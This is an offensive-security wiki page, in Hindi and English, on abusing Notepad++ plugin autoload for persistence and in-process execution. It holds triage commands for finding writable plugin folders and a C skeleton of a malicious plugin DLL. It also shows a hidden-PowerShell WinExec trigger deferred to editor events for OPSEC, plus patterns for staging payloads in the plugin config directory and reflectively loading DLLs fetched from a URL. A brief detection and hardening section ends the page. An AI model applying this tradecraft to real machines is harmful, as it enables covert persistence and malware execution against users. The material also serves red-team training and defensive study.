# Notepad++ Plugin Autoload Persistence & Execution

{{#include ../../banners/hacktricks-training.md}}

Notepad++ लॉन्च होने पर अपने `plugins` subfolders के अंदर मिली **हर plugin DLL को autoload** करेगा। किसी **writable Notepad++ installation** में malicious plugin डालने से editor शुरू होने पर हर बार `notepad++.exe` के अंदर code execution मिलता है, जिसका उपयोग **persistence**, stealthy **initial execution**, या **in-process loader** के रूप में किया जा सकता है, यदि editor elevated अवस्था में लॉन्च किया गया हो।<sup>[[1]](#references)</sup>

**Notepad++ 7.6+** से अपेक्षित manual-install layout **प्रत्येक plugin के लिए एक subfolder** है (`plugins\<PluginName>\<PluginName>.dll`)। **portable mode** में (`notepad++.exe` के पास `doLocalConf.xml` मौजूद होने पर), पूरा application tree उसी directory में local रहता है, जिससे copied/admin tool bundles अक्सर user-writable execution surface बन जाते हैं।<sup>[[2]](#references)</sup>

## Writable plugin locations

- Standard install: `C:\Program Files\Notepad++\plugins\<PluginName>\<PluginName>.dll` (आमतौर पर write करने के लिए admin privileges आवश्यक होते हैं)।<sup>[[1]](#references)</sup>
- low-privileged operators के लिए writable विकल्प:<sup>[[1]](#references)</sup>
- **portable Notepad++ build** को user-writable folder में उपयोग करें।
- `C:\Program Files\Notepad++` को user-controlled path (जैसे `%LOCALAPPDATA%\npp\`) पर copy करें और वहां से `notepad++.exe` चलाएं।
- **admin tool bundles**, extracted zip copies, या help-desk toolkits खोजें, जिनमें पहले से `doLocalConf.xml` मौजूद हो और जो `Program Files` के बाहर स्थित हों।
- प्रत्येक plugin को `plugins` के अंदर अपना subfolder मिलता है और वह startup पर automatically load होता है; menu entries **Plugins** के अंतर्गत दिखाई देती हैं।<sup>[[2]](#references)</sup>

त्वरित triage:
```cmd
where /r C:\ notepad++.exe 2>nul
for /d %D in ("%ProgramFiles%\Notepad++" "%ProgramFiles(x86)%\Notepad++" "%LOCALAPPDATA%\*notepad*" "%USERPROFILE%\Desktop\*notepad*") do @if exist "%~fD\plugins" echo [*] %~fD
icacls "C:\Program Files\Notepad++\plugins" 2>nul
```
## Plugin load points (execution primitives)
Notepad++ specific **exported functions** की अपेक्षा करता है। ये सभी initialization के दौरान call किए जाते हैं, जिससे execution के कई surfaces मिलते हैं:<sup>[[1]](#references)</sup>
- **`DllMain`** — DLL load होने पर तुरंत run होता है (पहला execution point)।
- **`setInfo(NppData)`** — load पर एक बार call किया जाता है ताकि Notepad++ handles प्रदान किए जा सकें; menu items register करने के लिए सामान्य स्थान।
- **`getName()`** — menu में दिखाया जाने वाला plugin name return करता है।
- **`getFuncsArray(int *nbF)`** — menu commands return करता है; empty होने पर भी startup के दौरान call किया जाता है।
- **`beNotified(SCNotification*)`** — Notepad++ / Scintilla events प्राप्त करता है (payloads को user action या editor event तक defer करने के लिए उपयोगी)।
- **`messageProc(UINT, WPARAM, LPARAM)`** — message handler, बड़े data exchanges के लिए उपयोगी।
- **`isUnicode()`** — load के समय check किया जाने वाला compatibility flag।

अधिकांश exports को **stubs** के रूप में implement किया जा सकता है; autoload के दौरान `DllMain` या ऊपर दिए गए किसी भी callback से execution हो सकता है।

## Minimal malicious plugin skeleton
अपेक्षित exports के साथ एक DLL compile करें और उसे किसी writable Notepad++ folder के अंतर्गत `plugins\\MyNewPlugin\\MyNewPlugin.dll` में रखें:<sup>[[1]](#references)</sup>
```c
BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID) { if (r == DLL_PROCESS_ATTACH) MessageBox(NULL, TEXT("Hello from Notepad++"), TEXT("MyNewPlugin"), MB_OK); return TRUE; }
extern "C" __declspec(dllexport) void setInfo(NppData) {}
extern "C" __declspec(dllexport) const TCHAR *getName() { return TEXT("MyNewPlugin"); }
extern "C" __declspec(dllexport) FuncItem *getFuncsArray(int *nbF) { *nbF = 0; return NULL; }
extern "C" __declspec(dllexport) void beNotified(SCNotification *) {}
extern "C" __declspec(dllexport) LRESULT messageProc(UINT, WPARAM, LPARAM) { return TRUE; }
extern "C" __declspec(dllexport) BOOL isUnicode() { return TRUE; }
```
1. DLL को (Visual Studio/MinGW) से build करें।
2. `plugins` के अंतर्गत plugin subfolder बनाएं और DLL को उसके अंदर रखें।
3. Notepad++ को restart करें; DLL अपने-आप load हो जाती है, जिससे `DllMain` और उसके बाद के callbacks execute होते हैं।

## `beNotified` के माध्यम से low-noise trigger pattern
OPSEC के लिए, कई payloads को **`DllMain` से fire नहीं होना चाहिए**। एक अधिक शांत pattern यह है कि plugin को cleanly load होने दें, फिर किसी वास्तविक editor event, जैसे **startup complete**, **buffer activation**, या **पहले typed character**, के बाद ही execute करें।
```c
static bool fired = false;
extern "C" __declspec(dllexport) void beNotified(SCNotification *n) {
if (fired) return;
if (n->nmhdr.code == NPPN_READY ||
n->nmhdr.code == NPPN_BUFFERACTIVATED ||
n->nmhdr.code == SCN_CHARADDED) {
fired = true;
WinExec("powershell -w hidden -nop -c <payload>", SW_HIDE);
}
}
```
यह noisy `DllMain` beacon की तुलना में public offensive research से बेहतर मेल खाता है: DLL startup पर अभी भी autoload होती है, लेकिन malicious action तब तक delay रहता है जब तक Notepad++ का वास्तव में उपयोग न होने लगे।

## secondary storage के रूप में plugin config directory का उपयोग करना
Notepad++ `NPPM_GETPLUGINSCONFIGDIR` expose करता है, जो **current user की plugin configuration directory** return करता है।<sup>[[3]](#references)</sup> एक malicious plugin इसका उपयोग on-disk DLL को minimal रखने के साथ-साथ encrypted config, staged payloads या tasking files को ऐसे path में store करने के लिए कर सकता है, जो normal plugin state के साथ blend in हो जाए।
```c
wchar_t cfg[MAX_PATH] = {0};
SendMessage(nppData._nppHandle, NPPM_GETPLUGINSCONFIGDIR, MAX_PATH, (LPARAM)cfg);
// Example result: %AppData%\Notepad++\plugins\config
```
Operationally यह तब उपयोगी है जब आप चाहते हैं:
- एक छोटी autoloaded bootstrap DLL;
- मुख्य plugin binary को दोबारा छुए बिना per-user tasking;
- भारी second stage से **autoload trigger** को अलग रखना।

## Reflective loader plugin pattern
एक weaponized plugin Notepad++ को **reflective DLL loader** में बदल सकता है:<sup>[[1]](#references)</sup>
- एक minimal UI/menu entry (जैसे, "LoadDLL") प्रस्तुत करें।
- payload DLL प्राप्त करने के लिए **file path** या **URL** स्वीकार करें।
- DLL को current process में reflectively map करें और एक exported entry point (जैसे, fetched DLL के अंदर loader function) invoke करें।
- लाभ: नया loader spawn करने के बजाय benign-looking GUI process का reuse; payload को `notepad++.exe` की integrity विरासत में मिलती है (elevated contexts सहित)।
- Trade-offs: disk पर एक **unsigned plugin DLL** छोड़ना noisy है; एक practical variation यह है कि autoloaded plugin को केवल stub के रूप में उपयोग करें और real implant को कहीं और encrypted/staged रखें।

## Detection और hardening notes
- **Notepad++ plugin directories** में होने वाले **writes** को block या monitor करें (user profiles में मौजूद portable copies सहित); controlled folder access या application allowlisting enable करें।
- `plugins` के अंतर्गत **new unsigned DLLs**, portable Notepad++ trees में changes, और `notepad++.exe` से होने वाली unusual **child processes/network activity** पर alert करें।
- Legitimate plugins का baseline तैयार करें और ऐसे किसी भी new DLL की जांच करें जो normal Notepad++ plugin interface export करता हो, लेकिन साथ ही shells, PowerShell या network beacons भी spawn करता हो।
- Plugin installation को केवल **Plugins Admin** के माध्यम से enforce करें और untrusted paths से portable copies के execution को restrict करें।

## References

- [1] [TrustedSec - Notepad++ Plugins: Plug and Payload](https://trustedsec.com/blog/notepad-plugins-plug-and-payload)
- [2] [Notepad++ User Manual - Plugins](https://npp-user-manual.org/docs/plugins/)
- [3] [Notepad++ User Manual - Plugin Communication](https://npp-user-manual.org/docs/plugin-communication/)

{{#include ../../banners/hacktricks-training.md}}
